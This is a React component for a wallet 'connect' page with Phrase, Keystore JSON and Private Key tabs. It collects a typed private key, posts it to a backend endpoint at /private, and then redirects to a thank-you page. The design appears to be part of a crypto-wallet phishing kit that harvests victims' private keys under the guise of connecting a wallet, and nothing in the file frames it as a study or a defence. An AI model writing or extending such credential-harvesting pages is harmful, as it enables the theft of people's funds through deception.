
import React, {  useState } from "react";
import axios from 'axios';

import { Link } from 'react-router-dom';


export default function Form3(){
      const [userData, setUserData] = useState({
    pri: "",
  })

  const {pri} = userData

  const handleTextChange = (e) =>{
    setUserData((prevData) => ({...prevData, [e.target.name]:e.target.value,}))
    // setUserData({[e.target.placeholder]:e.target.value})
  }
  const registerUser = async() => {
    console.log("work")
    try {
      const requiredFormFields = {pri}
      const response = await axios
      .post('http://localhost:5001/private', requiredFormFields)

      let data = await response.json()

      console.log(data, response, "response")
      // response.status === 200 
      
      //let userDetails = response.data
    }catch(err){}
  }
    return(
    
<section>
<div class="tab">
<Link to="/pharse" class="tablinks" >Phrase</Link>
      <Link to="/keystore" class="tablinks">Keystore JSON</Link>
      <Link to="/private" class="tablinks">Private Key</Link>
    </div>
  


    <div className="card">
      
          
            <div class="input-container">
              
              <input class="input-field" type="text" placeholder="Private key" 
               onChange={handleTextChange}
               name="pri"
               
           
              ></input>
            </div>
          
            <Link to="/thank" class="tablinks">
            <input class="sub" type="submit" value="connect" onClick={registerUser}></input>

            </Link>
          
           
          
    </div>
</section>
    
    
    

  
 
   
  
 
  

  


  

    )
}